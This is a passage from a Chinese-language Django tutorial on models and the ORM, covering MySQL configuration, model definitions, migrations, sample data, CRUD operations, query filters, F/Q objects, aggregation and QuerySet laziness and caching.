注册自定义中的间件2]</code></pre><blockquote><p><strong>重要提示：中间件执行顺序</strong></p></blockquote><ul><li>在视图被处理前(输入)，中间件<strong>由上至下</strong>依次执行</li><li>在视图被处理后(输出)，中间件<strong>由下至上</strong>依次执行</li></ul><h2 id="三、模型（models）"><a href="#三、模型（models）" class="headerlink" title="三、模型（models）"></a>三、模型（models）</h2><p><strong>提示：</strong></p><blockquote><ul><li>模型是Django程序处理数据库数据的模块</li><li>Django的模型是定义在子应用的<strong><code>models.py</code></strong>中的</li></ul></blockquote><p><strong>经验值分享</strong></p><p><strong>1. 读取外键</strong></p><ul><li>以图书和英雄这两个模型类为例</li></ul><pre><code>class BookInfo(models.Model):    &quot;&quot;&quot;图书信息模型类&quot;&quot;&quot;    btitle = models.CharField(max_length=20, verbose_name=&#39;名称&#39;)class HeroInfo(models.Model):    hname = models.CharField(max_length=20, verbose_name=&#39;名称&#39;)     # 外键    hbook = models.ForeignKey(BookInfo, on_delete=models.CASCADE, verbose_name=&#39;图书&#39;)</code></pre><ul><li>读取外键的方式：<ul><li>方式一：<strong><code>hero.hbook.id</code></strong></li><li>方式二：<strong><code>hero.hbook_id</code></strong></li></ul></li><li>问题：<ul><li><strong><code>hero.hbook.id</code></strong>：不安全，如果hbook为空，会报错，因为空对象不能读取任何属性</li><li><strong><code>hero.hbook_id</code></strong>：安全，如果hbook_id为空，不会报错，获取的是空值</li></ul></li><li>结论：<ul><li>如果外键允许为空，那么务必使用<strong><code>方式二</code></strong>读取外键</li><li>如果外键一定不为空，那么使用哪种方式读取外键都可以</li></ul></li></ul><p><strong>2. 查询集QuerySet缓存的特点</strong></p><blockquote><ul><li>参考知识点：<strong>查询集QuerySet</strong></li></ul></blockquote><ul><li>提示：<ul><li>查询集表示从数据库中获取的对象集合。具有自动缓存的特点。</li></ul></li><li>查询集自动缓存：<ul><li>使用同一个查询集，第一次使用时会发生数据库的查询，然后Django会把结果缓存下来，再次使用这个查询集时会使用缓存的数据，减少了数据库的查询次数。</li></ul></li><li>问题：<ul><li>如果某些数据需要频繁的更新，那么在查询和使用时就不能有缓存出现</li><li>比如：实时更新库存和销量，库存和销量每次在使用时必须是最新的结果，不能是之前缓存中的结果</li></ul></li><li>结论：<ul><li>如果我们要频繁的更新数据时，那么要更新的数据不要使用查询集获取</li><li>返回查询集的方法：all()、filter()、exclude()、order_by()</li><li>不返回查询集的方法：get()</li><li>所以<strong>如果要实时更新数据，建议采用get()查询要更新的数据</strong></li></ul></li></ul><h3 id="1-准备数据库"><a href="#1-准备数据库" class="headerlink" title="1.准备数据库"></a>1.准备数据库</h3><h4 id="1-1-创建MySQL数据库"><a href="#1-1-创建MySQL数据库" class="headerlink" title="1.1 创建MySQL数据库"></a>1.1 创建MySQL数据库</h4><blockquote><p>在ubuntu系统的MySQL程序中创建一个数据库</p></blockquote><pre><code class="sql">mysql -uroot -pcreate database django_demo default charset=utf8;</code></pre><h4 id="1-2-配置MySQL数据库"><a href="#1-2-配置MySQL数据库" class="headerlink" title="1.2 配置MySQL数据库"></a>1.2 配置MySQL数据库</h4><blockquote><p>在<strong><code>settings.py</code></strong>中配置数据库的连接信息</p><ul><li>以下是默认的数据库配置信息</li></ul></blockquote><pre><code class="python">DATABASES = {    &#39;default&#39;: {        &#39;ENGINE&#39;: &#39;django.db.backends.sqlite3&#39;,        &#39;NAME&#39;: os.path.join(BASE_DIR, &#39;db.sqlite3&#39;),    }}</code></pre><blockquote><p>修改<strong><code>DATABASES</code></strong>配置信息</p></blockquote><pre><code class="python">DATABASES = {    &#39;default&#39;: {        &#39;ENGINE&#39;: &#39;django.db.backends.mysql&#39;,        &#39;HOST&#39;: &#39;192.168.103.240&#39;,  # 数据库主机        &#39;PORT&#39;: 3306,  # 数据库端口        &#39;USER&#39;: &#39;root&#39;,  # 数据库用户名        &#39;PASSWORD&#39;: &#39;mysql&#39;,  # 数据库用户密码        &#39;NAME&#39;: &#39;django_demo&#39;  # 数据库名字    }}</code></pre><h4 id="1-3-安装mysqlclient：MySQL数据库的客户端驱动"><a href="#1-3-安装mysqlclient：MySQL数据库的客户端驱动" class="headerlink" title="1.3 安装mysqlclient：MySQL数据库的客户端驱动"></a>1.3 安装mysqlclient：MySQL数据库的客户端驱动</h4><blockquote><p>安装mysqlclient</p></blockquote><pre><code class="python"># 进入虚拟环境pip install mysqlclient -i https://pypi.tuna.tsinghua.edu.cn/simple/</code></pre><h4 id="1-4-解决mysqlclient安装出错的问题"><a href="#1-4-解决mysqlclient安装出错的问题" class="headerlink" title="1.4 解决mysqlclient安装出错的问题"></a>1.4 解决mysqlclient安装出错的问题</h4><pre><code class="shell">1. 更换ubuntu中默认的源为国内的源：提升软件下载速度2. 更新apt-get的源和升级3. 安装libmysqlclient-dev：因为mysqlclient依赖这个软件4. 虚拟环境中安装mysqlclient==1.4.65. 测试：重启Django程序</code></pre><blockquote><p><strong>1.4.1 更换ubuntu中默认的源为国内的源</strong></p></blockquote><pre><code class="shell"># 第一步：备份 /etc/apt/sources.list# 第二步：在/etc/apt/sources.list中添加以下阿里源deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse# 备份$ cp /etc/apt/sources.list /etc/apt/sources.list.bak# 添加阿里源$ sudo vim /etc/apt/sources.list</code></pre><blockquote><p><strong>1.4.2 更新apt-get的源和升级</strong></p><ul><li>其中<code>upgrade</code>会执行很久，大家需要耐心等待</li></ul></blockquote><pre><code class="shell">$ sudo apt-get update$ sudo apt-get upgrade</code></pre><blockquote><p><strong>1.4.3 安装libmysqlclient-dev</strong></p></blockquote><pre><code class="shell">$ sudo apt-get install libmysqlclient-dev</code></pre><h3 id="2-模型类迁移建表"><a href="#2-模型类迁移建表" class="headerlink" title="2.模型类迁移建表"></a>2.模型类迁移建表</h3><p>如何创建数据库表？</p><ul><li>可以使用原生的SQL语句创建数据库表</li><li>也可以<strong>使用Django提供的模型类创建数据库表</strong></li></ul><blockquote><p>如何使用Django提供的模型类创建数据库表？</p></blockquote><ul><li>我们需要了解ORM框架</li><li>我们需要学会定义模型类</li><li>我们需要学会迁移模型类建表</li></ul><h4 id="2-1-ORM框架"><a href="#2-1-ORM框架" class="headerlink" title="2.1 ORM框架"></a>2.1 ORM框架</h4><blockquote><p>ORM框架介绍</p></blockquote><ul><li>O是object，也就是<strong>类或者对象</strong>的意思，这里的类就是模型类</li><li>R是relation，也就是关系数据库中<strong>数据表</strong>的意思</li><li>M是mapping，也就是<strong>映射</strong>的意思</li><li>在ORM框架中，它帮我们把模型类和数据表进行了一个映射，可以让我们<strong>通过模型类及对象就能操作它所对应的数据表中的数据</strong></li><li>ORM框架它还可以<strong>根据我们设计的模型类自动帮我们生成数据库中对应的数据表</strong>，省去了我们自己建表的过程</li></ul><blockquote><p>提示：</p></blockquote><ul><li><strong>Django框架中内嵌了ORM框架</strong>，所以在使用Django框架时，我们不需要直接面向数据库编程</li><li>而是定义模型类，通过模型类及对象完成数据表的增删改查操作</li></ul><blockquote><p><strong>ORM框架作用：</strong></p></blockquote><ul><li>帮助Django的开发者以面向对象的思想去操作数据库。</li><li>并且ORM框架也帮助程序员屏蔽了数据库之间的差异。</li></ul><h4 id="2-2-定义模型类"><a href="#2-2-定义模型类" class="headerlink" title="2.2 定义模型类"></a>2.2 定义模型类</h4><blockquote><p>提示：模型类的定义思路</p></blockquote><pre><code>1. 先根据需求设计数据表2. 再根据数据表设计方案定义模型类</code></pre><blockquote><p><strong>2.2.1 根据需求设计数据表</strong></p></blockquote><ul><li>需求：<ul><li>“图书-英雄”管理</li></ul></li><li>分析关联关系：<ul><li>一本书里面会有多个英雄人物，每个英雄人物都会属于某一本书</li><li>数据表一：图书信息表 (一方)</li><li>数据表二：英雄信息表 (多方)</li></ul></li><li>绑定关联关系：<ul><li>外键定义在多方对应的数据表中，即，外键需要定义在英雄信息表中</li></ul></li></ul><blockquote><p><strong>2.2.2 定义模型类</strong></p></blockquote><ul><li>模型类被定义在<strong><code>子应用/models.py</code></strong>文件中</li><li><strong>模型类必须继承自Model类</strong>，位于<code>django.db.models</code>中</li><li>创建子应用<strong><code>booktest</code></strong>，并在其<code>models.py</code>文件中定义模型类</li></ul><pre><code class="python">class BookInfo(models.Model):    &quot;&quot;&quot;图书信息：演示一对多，一方&quot;&quot;&quot;    btitle = models.CharField(max_length=20, verbose_name=&#39;书名&#39;)    bpub_date = models.DateField(verbose_name=&#39;发布日期&#39;)    bread = models.IntegerField(default=0, verbose_name=&#39;阅读量&#39;)    bcomment = models.IntegerField(default=0, verbose_name=&#39;评论量&#39;)    is_delete = models.BooleanField(default=False, verbose_name=&#39;逻辑删除&#39;)    class Meta:        &quot;&quot;&quot;模型类的元类：用于修改、配置模型类对应的数据表&quot;&quot;&quot;        db_table = &#39;tb_books&#39;  # 自定义数据库表名    def __str__(self):        &quot;&quot;&quot;定义每个数据对象的显示信息&quot;&quot;&quot;        return self.btitle # 输出该模型数据对象时，只输出书名class HeroInfo(models.Model):    &quot;&quot;&quot;英雄信息：演示一对多，多方&quot;&quot;&quot;    # 确定性别字段的取值范围    GENDER_CHOICES = (        (0, &#39;female&#39;),        (1, &#39;male&#39;)    )    hbook = models.ForeignKey(BookInfo, on_delete=models.CASCADE, verbose_name=&#39;英雄属于的图书&#39;)    hname = models.CharField(max_length=20, verbose_name=&#39;人名&#39;)    hgender = models.SmallIntegerField(choices=GENDER_CHOICES, default=0, verbose_name=&#39;性别&#39;)    hcomment = models.CharField(max_length=200, null=True, verbose_name=&#39;描述信息&#39;)    is_delete = models.BooleanField(default=False, verbose_name=&#39;逻辑删除&#39;)    class Meta:        db_table = &#39;tb_heros&#39;    def __str__(self):        return self.hname</code></pre><h4 id="2-3-模型类说明"><a href="#2-3-模型类说明" class="headerlink" title="2.3 模型类说明"></a>2.3 模型类说明</h4><blockquote><p><strong>2.3.1 关于主键</strong></p></blockquote><ul><li>Django会为表创建自动增长的主键列，每个模型只能有一个主键列</li><li>默认创建的主键列属性为<code>id</code>，可以使用<code>pk</code>代替，pk全拼为primary key</li><li>如果使用选项设置某属性为主键列后Django不会再创建自动增长的主键列</li></ul><blockquote><p><strong>2.3.2 关于属性命名</strong></p></blockquote><ul><li><p>不能是python的保留关键字</p></li><li><p>不允许使用连续的下划线，这是由Django的查询方式决定的</p></li><li><p>定义属性时需要指定字段类型，通过字段类型的参数指定选项，语法如下：</p><pre><code class="python">属性 = models.字段类型(选项)</code></pre></li></ul><blockquote><p><strong>2.3.3 关于数据库表名</strong></p></blockquote><ul><li>模型类如果未指明表名，Django默认以 <strong>小写app应用名_小写模型类名</strong> 为数据库表名</li><li>但是，可通过模型的元类中的<strong><code>db_table</code></strong>自定义数据库表名</li></ul><blockquote><p><strong>2.3.4 关于字段类型</strong></p></blockquote><pre><code class="sql">CREATE TABLE `tb_books` (  `id` int(11) NOT NULL AUTO_INCREMENT,  `btitle` varchar(20) NOT NULL,  `bpub_date` date NOT NULL,  `bread` int(11) NOT NULL,  `bcomment` int(11) NOT NULL,  `is_delete` tinyint(1) NOT NULL,  PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;</code></pre><table><thead><tr><th align="left">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">AutoField</td><td align="left">自动增长的IntegerField，通常不用指定，不指定时Django会自动创建属性名为id的自动增长属性</td></tr><tr><td align="left">BooleanField</td><td align="left">布尔字段，值为True或False</td></tr><tr><td align="left">NullBooleanField</td><td align="left">支持Null、True、False三种值</td></tr><tr><td align="left">CharField</td><td align="left">字符串，参数max_length表示最大字符个数</td></tr><tr><td align="left">TextField</td><td align="left">大文本字段，一般超过4000个字符时使用</td></tr><tr><td align="left">IntegerField</td><td align="left">整数</td></tr><tr><td align="left">DecimalField</td><td align="left">十进制浮点数， 参数max_digits表示总位数， 参数decimal_places表示小数位数</td></tr><tr><td align="left">FloatField</td><td align="left">浮点数</td></tr><tr><td align="left">DateField</td><td align="left">日期， 参数auto_now表示每次保存对象时，自动设置该字段为当前时间，用于”最后一次修改”的时间戳，它总是使用当前日期，默认为False； 参数auto_now_add表示当对象第一次被创建时自动设置当前时间，用于创建的时间戳，它总是使用当前日期，默认为False; 参数auto_now_add和auto_now是相互排斥的，组合将会发生错误</td></tr><tr><td align="left">TimeField</td><td align="left">时间，参数同DateField</td></tr><tr><td align="left">DateTimeField</td><td align="left">日期时间，参数同DateField</td></tr><tr><td align="left">FileField</td><td align="left">上传文件字段</td></tr><tr><td align="left">ImageField</td><td align="left">继承于FileField，对上传的内容进行校验，确保是有效的图片</td></tr></tbody></table><blockquote><p><strong>2.3.5 关于字段选项</strong></p></blockquote><table><thead><tr><th align="left">选项</th><th>说明</th></tr></thead><tbody><tr><td align="left">null</td><td>如果为True，表示允许为空，默认值是False</td></tr><tr><td align="left">db_column</td><td>字段的名称，如果未指定，则使用属性的名称</td></tr><tr><td align="left">db_index</td><td>若值为True, 则在表中会为此字段创建索引，默认值是False</td></tr><tr><td align="left">default</td><td>默认</td></tr><tr><td align="left">primary_key</td><td>若为True，则该字段会成为模型的主键字段，默认值是False，一般作为AutoField的选项使用</td></tr><tr><td align="left">unique</td><td>如果为True, 这个字段在表中必须有唯一值，默认值是False</td></tr></tbody></table><blockquote><p><strong>2.3.6 关于外键</strong></p></blockquote><p>在设置外键时，需要通过<strong>on_delete</strong>选项指明主表删除数据时，对于外键引用表数据如何处理，在django.db.models中包含了可选常量：</p><ul><li><strong>CASCADE</strong> 级联，删除主表数据时连通一起删除外键表中数据</li><li><strong>PROTECT</strong> 保护，通过抛出<strong>ProtectedError</strong>异常，来阻止删除主表中被外键应用的数据</li><li><strong>SET_NULL</strong> 设置为NULL，仅在该字段null=True允许为null时可用</li><li><strong>SET_DEFAULT</strong> 设置为默认值，仅在该字段设置了默认值时可用</li><li><strong>SET()</strong> 设置为特定值或者调用特定方法</li><li><strong>DO_NOTHING</strong> 不做任何操作，如果数据库前置指明级联性，此选项会抛出<strong>IntegrityError</strong>异常</li></ul><h4 id="2-4-迁移模型类建表"><a href="#2-4-迁移模型类建表" class="headerlink" title="2.4 迁移模型类建表"></a>2.4 迁移模型类建表</h4><blockquote><p><strong>2.4.1 生成迁移文件</strong></p></blockquote><pre><code class="python">python manage.py makemigrations</code></pre><blockquote><p><strong>2.4.2 同步到数据库中</strong></p></blockquote><pre><code class="python">python manage.py migrate</code></pre><h4 id="2-5-添加测试数据"><a href="#2-5-添加测试数据" class="headerlink" title="2.5 添加测试数据"></a>2.5 添加测试数据</h4><pre><code class="mysql">insert into tb_books(btitle,bpub_date,bread,bcomment,is_delete) values(&#39;射雕英雄传&#39;,&#39;1980-5-1&#39;,12,34,0),(&#39;天龙八部&#39;,&#39;1986-7-24&#39;,36,40,0),(&#39;笑傲江湖&#39;,&#39;1995-12-24&#39;,20,80,0),(&#39;雪山飞狐&#39;,&#39;1987-11-11&#39;,58,24,0);</code></pre><pre><code class="mysql">insert into tb_heros(hname,hgender,hbook_id,hcomment,is_delete) values(&#39;郭靖&#39;,1,1,&#39;降龙十八掌&#39;,0),(&#39;黄蓉&#39;,0,1,&#39;打狗棍法&#39;,0),(&#39;黄药师&#39;,1,1,&#39;弹指神通&#39;,0),(&#39;欧阳锋&#39;,1,1,&#39;蛤蟆功&#39;,0),(&#39;梅超风&#39;,0,1,&#39;九阴白骨爪&#39;,0),(&#39;乔峰&#39;,1,2,&#39;降龙十八掌&#39;,0),(&#39;段誉&#39;,1,2,&#39;六脉神剑&#39;,0),(&#39;虚竹&#39;,1,2,&#39;天山六阳掌&#39;,0),(&#39;王语嫣&#39;,0,2,&#39;神仙姐姐&#39;,0),(&#39;令狐冲&#39;,1,3,&#39;独孤九剑&#39;,0),(&#39;任盈盈&#39;,0,3,&#39;弹琴&#39;,0),(&#39;岳不群&#39;,1,3,&#39;华山剑法&#39;,0),(&#39;东方不败&#39;,0,3,&#39;葵花宝典&#39;,0),(&#39;胡斐&#39;,1,4,&#39;胡家刀法&#39;,0),(&#39;苗若兰&#39;,0,4,&#39;黄衣&#39;,0),(&#39;程灵素&#39;,0,4,&#39;医术&#39;,0),(&#39;袁紫衣&#39;,0,4,&#39;六合拳&#39;,0);</code></pre><h3 id="3-增删改查"><a href="#3-增删改查" class="headerlink" title="3.增删改查"></a>3.增删改查</h3><h4 id="3-1-shell工具-用于在终端交互环境测试代码的"><a href="#3-1-shell工具-用于在终端交互环境测试代码的" class="headerlink" title="3.1 shell工具 (用于在终端交互环境测试代码的)"></a>3.1 shell工具 (用于在终端交互环境测试代码的)</h4><p>Django的manage工具提供了<strong>shell</strong>命令，帮助我们配置好当前工程的运行环境（如连接好数据库等），以便可以直接在终端中执行测试python语句。</p><p>如果有需要，通过如下命令进入shell</p><pre><code class="python">python manage.py shell</code></pre><p>导入两个模型类，以便后续使用</p><pre><code class="python">from booktest.models import BookInfo, HeroInfo</code></pre><h4 id="3-2-新增"><a href="#3-2-新增" class="headerlink" title="3.2 新增"></a>3.2 新增</h4><p>增加数据有两种方法。</p><p><strong>1）save</strong></p><p>通过创建模型类对象，<strong><code>模型对象.save()</code></strong>方法保存到数据库中。</p><pre><code class="python"># 新增：方式一book = BookInfo()book.btitle = &#39;西游记&#39;book.bpub_date = &#39;2020-05-18&#39;book.bread = 20book.bcomment = 30book.save()</code></pre><p><strong>2）create</strong></p><p>通过<strong><code>模型类.objects.create()</code></strong>保存。</p><pre><code class="python"># 新增：方式二BookInfo.objects.create(    btitle=&#39;三国演义&#39;,    bpub_date=&#39;2020-05-20&#39;,    bread=100,    bcomment=200)</code></pre><h4 id="3-3-修改"><a href="#3-3-修改" class="headerlink" title="3.3 修改"></a>3.3 修改</h4><p>修改更新有两种方法</p><p><strong>1）save</strong></p><p><strong>修改模型类对象的属性，然后执行<code>save()</code>方法</strong></p><pre><code class="python">hero = HeroInfo.objects.get(hname=&#39;猪八戒&#39;)hero.hname = &#39;猪悟能&#39;hero.save()</code></pre><p><strong>2）update</strong></p><p>使用<strong><code>模型类.objects.filter().update()</code></strong>，会返回受影响的行数</p><pre><code class="python">HeroInfo.objects.filter(hname=&#39;沙悟净&#39;).update(hname=&#39;沙僧&#39;)</code></pre><h4 id="3-4-删除"><a href="#3-4-删除" class="headerlink" title="3.4 删除"></a>3.4 删除</h4><p>删除有两种方法</p><p><strong>1）模型类对象delete</strong></p><pre><code class="python">hero = HeroInfo.objects.get(id=13)hero.delete()</code></pre><p><strong>2）模型类.objects.filter().delete()</strong></p><pre><code class="python">HeroInfo.objects.filter(id=14).delete()</code></pre><h4 id="3-5-查询"><a href="#3-5-查询" class="headerlink" title="3.5 查询"></a>3.5 查询</h4><h5 id="3-5-1-基本查询"><a href="#3-5-1-基本查询" class="headerlink" title="3.5.1 基本查询"></a>3.5.1 基本查询</h5><p><strong>get</strong> 查询单一结果，如果不存在会抛出<strong>模型类.DoesNotExist</strong>异常。</p><p><strong>all</strong> 查询多个结果。</p><p><strong>count</strong> 查询结果数量。</p><pre><code class="python">&gt;&gt;&gt; BookInfo.objects.all()&lt;QuerySet [&lt;BookInfo: 射雕英雄传&gt;, &lt;BookInfo: 天龙八部&gt;, &lt;BookInfo: 笑傲江湖&gt;, &lt;BookInfo: 雪山飞狐&gt;, &lt;BookInfo: 西游记&gt;]&gt;&gt;&gt;&gt; book = BookInfo.objects.get(btitle=&#39;西游记&#39;)&gt;&gt;&gt; book.id5&gt;&gt;&gt; BookInfo.objects.get(id=3)&lt;BookInfo: 笑傲江湖&gt;&gt;&gt;&gt; BookInfo.objects.get(pk=3)&lt;BookInfo: 笑傲江湖&gt;&gt;&gt;&gt; BookInfo.objects.get(id=100)Traceback (most recent call last):  File &quot;&lt;console&gt;&quot;, line 1, in &lt;module&gt;  File &quot;/Users/delron/.virtualenv/dj/lib/python3.6/site-packages/django/db/models/manager.py&quot;, line 85, in manager_method    return getattr(self.get_queryset(), name)(*args, **kwargs)  File &quot;/Users/delron/.virtualenv/dj/lib/python3.6/site-packages/django/db/models/query.py&quot;, line 380, in get    self.model._meta.object_namedb.models.DoesNotExist: BookInfo matching query does not exist.&gt;&gt;&gt; BookInfo.objects.count()6</code></pre><h5 id="3-5-2-过滤查询"><a href="#3-5-2-过滤查询" class="headerlink" title="3.5.2 过滤查询"></a>3.5.2 过滤查询</h5><p>实现SQL中的where功能，包括</p><ul><li><strong>filter</strong> 过滤出满足条件的多个结果</li><li><strong>exclude</strong> 排除掉符合条件剩下的结果</li></ul><p>过滤条件的表达语法如下：</p><pre><code class="python">属性名称__比较运算符=值# 属性名称和比较运算符间使用两个下划线，所以属性名不能包括多个下划线</code></pre><p><strong>1）相等</strong></p><p><strong>exact：表示判等。</strong></p><p>例：查询编号为1的图书。</p><pre><code>BookInfo.objects.filter(id__exact=1)可简写为：BookInfo.objects.filter(id=1)</code></pre><p><strong>2）模糊查询</strong></p><p><strong>contains：是否包含。</strong></p><blockquote><p>说明：如果要包含%无需转义，直接写即可。</p></blockquote><p>例：查询书名包含’传’的图书。</p><pre><code class="python">BookInfo.objects.filter(btitle__contains=&#39;传&#39;)</code></pre><p><strong>startswith、endswith：以指定值开头或结尾。</strong></p><p>例：查询书名以’部’结尾的图书</p><pre><code class="python">BookInfo.objects.filter(btitle__endswith=&#39;部&#39;)</code></pre><blockquote><p>以上运算符都区分大小写，在这些运算符前加上i表示不区分大小写，如iexact、icontains、istartswith、iendswith.</p></blockquote><p><strong>3） 空查询</strong></p><p><strong>isnull：是否为null。</strong></p><p>例：查询书名不为空的图书。</p><pre><code class="python">BookInfo.objects.filter(btitle__isnull=False)</code></pre><p><strong>4） 范围查询</strong></p><p><strong>in：是否包含在范围内。</strong></p><p>例：查询编号为1或3或5的图书</p><pre><code class="python">BookInfo.objects.filter(id__in=[1, 3, 5])</code></pre><p><strong>5）比较查询</strong></p><ul><li><strong>gt</strong> 大于 (greater then)</li><li><strong>gte</strong> 大于等于 (greater then equal)</li><li><strong>lt</strong> 小于 (less then)</li><li><strong>lte</strong> 小于等于 (less then equal)</li></ul><p>例：查询编号大于3的图书</p><pre><code class="python">BookInfo.objects.filter(id__gt=3)</code></pre><p><strong>不等于的运算符，使用exclude()过滤器。</strong></p><p>例：查询编号不等于3的图书</p><pre><code class="python">BookInfo.objects.exclude(id=3)</code></pre><p><strong>6）日期查询</strong></p><p><strong>year、month、day、week_day、hour、minute、second：对日期时间类型的属性进行运算。</strong></p><p>例：查询1980年发表的图书。</p><pre><code class="python">BookInfo.objects.filter(bpub_date__year=1980)</code></pre><p>例：查询1980年1月1日后发表的图书。</p><pre><code class="python">BookInfo.objects.filter(bpub_date__gt=date(1990, 1, 1))</code></pre><h5 id="F对象"><a href="#F对象" class="headerlink" title="F对象"></a>F对象</h5><p>之前的查询都是对象的属性与常量值比较，两个属性怎么比较呢？ 答：使用F对象，被定义在django.db.models中。</p><p>语法如下：</p><pre><code>F(属性名)</code></pre><p>例：查询阅读量大于等于评论量的图书。</p><pre><code class="python">from django.db.models import FBookInfo.objects.filter(bread__gte=F(&#39;bcomment&#39;))</code></pre><p>可以在F对象上使用算数运算。</p><p>例：查询阅读量大于2倍评论量的图书。</p><pre><code class="python">BookInfo.objects.filter(bread__gt=F(&#39;bcomment&#39;) * 2)</code></pre><h5 id="Q对象"><a href="#Q对象" class="headerlink" title="Q对象"></a>Q对象</h5><p><strong>多个过滤器逐个调用表示逻辑与关系，同sql语句中where部分的and关键字。</strong></p><p>例：查询阅读量大于20，并且编号小于3的图书。</p><pre><code class="python">BookInfo.objects.filter(bread__gt=20,id__lt=3)或BookInfo.objects.filter(bread__gt=20).filter(id__lt=3)</code></pre><p><strong>如果需要实现逻辑或or的查询，需要使用Q()对象结合|运算符</strong>，Q对象被义在django.db.models中。</p><p>语法如下：</p><pre><code>Q(属性名__运算符=值)</code></pre><p>例：查询阅读量大于20的图书，改写为Q对象如下。</p><pre><code class="python">from django.db.models import QBookInfo.objects.filter(Q(bread__gt=20))</code></pre><p>Q对象可以使用&amp;、|连接，&amp;表示逻辑与，|表示逻辑或。</p><p>例：查询阅读量大于20，或编号小于3的图书，只能使用Q对象实现</p><pre><code class="python">BookInfo.objects.filter(Q(bread__gt=20) | Q(pk__lt=3))</code></pre><p>Q对象前可以使用~操作符，表示非not。</p><p>例：查询编号不等于3的图书。</p><pre><code class="python">BookInfo.objects.filter(~Q(pk=3))</code></pre><h5 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h5><p>使用aggregate()过滤器调用聚合函数。聚合函数包括：<strong>Avg</strong> 平均，<strong>Count</strong> 数量，<strong>Max</strong> 最大，<strong>Min</strong> 最小，<strong>Sum</strong> 求和，被定义在django.db.models中。</p><p>例：查询图书的总阅读量。</p><pre><code class="python">from django.db.models import SumBookInfo.objects.aggregate(Sum(&#39;bread&#39;))</code></pre><p>注意aggregate的返回值是一个字典类型，格式如下：</p><pre><code class="python">  {&#39;属性名__聚合类小写&#39;:值}  如:{&#39;bread__sum&#39;:3}</code></pre><p>使用count时一般不使用aggregate()过滤器。</p><p>例：查询图书总数。</p><pre><code class="python">BookInfo.objects.count()</code></pre><p>注意count函数的返回值是一个数字。</p><h5 id="3-5-3-排序"><a href="#3-5-3-排序" class="headerlink" title="3.5.3 排序"></a>3.5.3 排序</h5><p>使用<strong>order_by</strong>对结果进行排序</p><pre><code class="python">BookInfo.objects.all().order_by(&#39;bread&#39;)  # 升序BookInfo.objects.all().order_by(&#39;-bread&#39;)  # 降序</code></pre><h5 id="3-5-4-关联查询"><a href="#3-5-4-关联查询" class="headerlink" title="3.5.4 关联查询"></a>3.5.4 关联查询</h5><p>由一到多的访问语法：</p><p>一对应的模型类对象.多对应的模型类名小写_set<br>例：</p><pre><code class="python">b = BookInfo.objects.get(id=1)b.heroinfo_set.all()</code></pre><p>由多到一的访问语法:</p><p>多对应的模型类对象.多对应的模型类中的关系类属性名<br>例：</p><pre><code class="python">h = HeroInfo.objects.get(id=1)h.hbook</code></pre><p>访问一对应的模型类关联对象的id语法:</p><p>多对应的模型类对象.关联类属性_id</p><p>例：</p><pre><code class="python">h = HeroInfo.objects.get(id=1)h.hbook_id</code></pre><h3 id="4-查询集QuerySet"><a href="#4-查询集QuerySet" class="headerlink" title="4.查询集QuerySet"></a>4.查询集QuerySet</h3><h4 id="4-1-概念"><a href="#4-1-概念" class="headerlink" title="4.1 概念"></a>4.1 概念</h4><p>Django的ORM中存在查询集的概念。</p><p>查询集，也称查询结果集、QuerySet，表示从数据库中获取的对象集合。</p><p>当调用如下过滤器方法时，Django会返回查询集（而不是简单的列表）：</p><ul><li>all()：返回所有数据。</li><li>filter()：返回满足条件的数据。</li><li>exclude()：返回满足条件之外的数据。</li><li>order_by()：对结果进行排序。</li></ul><p>对查询集可以再次调用过滤器进行过滤，如</p><pre><code class="python">BookInfo.objects.filter(bread__gt=30).order_by(&#39;bpub_date&#39;)</code></pre><p>也就意味着查询集可以含有零个、一个或多个过滤器。过滤器基于所给的参数限制查询的结果。</p><p><strong>从SQL的角度讲，查询集与select语句等价，过滤器像where、limit、order by子句。</strong></p><p><strong>判断某一个查询集中是否有数据</strong>：</p><ul><li>exists()：判断查询集中是否有数据，如果有则返回True，没有则返回False。</li></ul><h4 id="4-2-两大特性"><a href="#4-2-两大特性" class="headerlink" title="4.2 两大特性"></a>4.2 两大特性</h4><h5 id="1）惰性执行"><a href="#1）惰性执行" class="headerlink" title="1）惰性执行"></a>1）惰性执行</h5><p>创建查询集不会访问数据库，直到调用数据时，才会访问数据库，调用数据的情况包括迭代、序列化、与if合用</p><p>例如，当执行如下语句时，并未进行数据库查询，只是创建了一个查询集qs</p><pre><code class="python">qs = BookInfo.objects.all()</code></pre><p>继续执行遍历迭代操作后，才真正的进行了数据库的查询</p><pre><code class="python">for book in qs:    print(book.btitle)</code></pre><h5 id="2）缓存"><a href="#2）缓存" class="headerlink" title="2）缓存"></a>2）缓存</h5><p>使用同一个查询集，第一次使用时会发生数据库的查询，然后Django会把结果缓存下来，再次使用这个查询集时会使用缓存的数据，减少了数据库的查询次数。</p><p><strong>情况一</strong>：如下是两个查询集，无法重用缓存，每次查询都会与数据库进行一次交互，增加了数据库的负载。</p><pre><code class="python">from booktest.models import BookInfo[book.id for book in BookInfo.objects.all()][book.id for book in BookInfo.objects.all()]</code></pre><p><strong>情况二</strong>：经过存储后，可以重用查询集，第二次使用缓存中的数据。</p><pre><code class="python">qs=BookInfo.objects.all()[book.id for book in qs][book.id for book in qs]</code></pre><h2 id="四、模板（templates）"><a href="#四、模板（templates）" class="headerlink" title="四、模板（templates）"></a>四、模板（templates）</h2><p><strong>提示：</strong></p><blockquote><ul><li>模板是Django程序渲染页面的模块</li><li>Django的模板是定义在<strong><code>templates</code></strong>文件目录中的</li></ul></blockquote><h3 id="1-配置模板"><a href="#1-配置模板" class="headerlink" title="1. 配置模板"></a>1. 配置模板</h3><blockquote><p><strong>1.1 